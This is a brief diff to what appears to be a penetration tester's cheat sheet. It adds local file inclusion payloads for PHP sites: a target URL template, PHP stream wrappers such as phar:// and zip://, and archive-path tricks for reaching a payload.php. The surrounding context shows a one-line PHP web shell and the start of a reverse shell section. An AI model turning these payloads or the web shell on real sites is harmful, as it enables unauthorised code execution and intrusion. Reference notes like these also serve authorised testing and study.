@@ -26,6 +26,28 @@ or use system() exec() passthru() shell_exec()
 <?php exec($_GET['cmd']);?>
 ```
 
+```bash
+https://$TARGET_URL?page=$LFI
+```
+PHP Wrapper LFI payloads:
+```text
+zip://
+rar://
+zlib://
+phar://
+file://
+```
+and:
+```text
+$FILE.zIP/payload.php
+$FILE.zIP#payload.php
+$FILE.zIP%23payload.php
+```
+sources:
+```url
+https://medium.com/@omarwhadidi9/10-ways-to-get-rce-from-lfi-f2bb696b67f6
+https://www.php.net/manual/en/wrappers.php
+```
 Python Rev shell
 ---
 ```bash
